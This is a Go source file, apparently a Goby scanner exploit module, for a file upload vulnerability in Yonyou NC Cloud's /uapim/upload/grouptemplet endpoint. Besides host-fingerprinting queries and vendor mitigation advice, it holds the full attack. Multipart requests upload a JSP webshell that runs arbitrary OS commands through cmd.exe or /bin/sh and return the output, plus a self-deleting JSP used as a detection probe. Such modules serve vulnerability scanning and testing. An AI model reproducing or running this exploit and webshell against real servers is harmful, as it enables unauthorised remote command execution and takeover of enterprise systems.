package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyon NC uapim/upload/grouptemplet file upload vulnerability",
    "Description": "<p>Yonyou NC Cloud is a large-scale enterprise digital platform launched by Yonyou.</p><p>There is a file upload vulnerability in UFIDA NC Cloud. Attackers can use the vulnerability to upload webshell and gain server privileges.</p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2022-04-15",
    "Author": "White_2021@163.com",
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in UFIDA NC Cloud. Attackers can use the vulnerability to upload webshell and gain server privileges.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryEXmnamw5gVZG9KAQ\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2U=\")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundaryEXmnamw5gVZG9KAQ--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/uapim/static/pages/nc/head.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryEXmnamw5gVZG9KAQ\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%@ page contentType=\"text/html; charset=UTF-8\" %>\r\n<%@ page import=\"java.io.*\" %>\r\n\r\n<%\nString cmd = request.getParameter(\"command\");\r\nString output = \"\";\nif (cmd !=null && cmd != \"\")\r\n    {\r\n        String[] command = System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\")>-1 ? new String[] {\"cmd.exe\", \"/c\", cmd} : new String[] {\"/bin/sh\", \"-c\", cmd};\r\n\r\n        String s = null;\r\n        try\r\n            {\r\n                Process p = Runtime.getRuntime().exec(command);\r\n                BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));\r\n                while ((s = sI.readLine()) != null)\r\n                    {\r\n                        output += s +\"\\r\\n\";\r\n                    }\r\n                BufferedReader sI1 = new BufferedReader(new InputStreamReader(p.getErrorStream()));\r\n                while ((s = sI1.readLine()) != null)\r\n                    {\r\n                        output += s +\"\\r\\n\";\r\n                    }\r\n            }\r\n        catch (IOException e)\r\n            {\r\n                e.printStackTrace();\r\n            }\r\n\r\n    }\r\n    else output=\"cmd shell\";\r\n%>\r\n<pre> <code><%=output%> </code></pre>\r\n------WebKitFormBoundaryEXmnamw5gVZG9KAQ--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/uapim/static/pages/nc/head.jsp?command={{{cmd}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "用友 NC uapim/upload/grouptemplet 文件上传漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC Cloud 是用友推出的大型企业数字化平台。</p><p>用友 NC Cloud 存在文件上传漏洞，攻击者可利用漏洞上传 webshell，获得服务器权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>用友 NC Cloud 存在文件上传漏洞，攻击者可利用漏洞上传 webshell，获得服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Yonyon NC uapim/upload/grouptemplet file upload vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC Cloud is a large-scale enterprise digital platform launched by Yonyou.</p><p>There is a file upload vulnerability in UFIDA NC Cloud. Attackers can use the vulnerability to upload webshell and gain server privileges.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is a file upload vulnerability in UFIDA NC Cloud. Attackers can use the vulnerability to upload webshell and gain server privileges.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10831"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}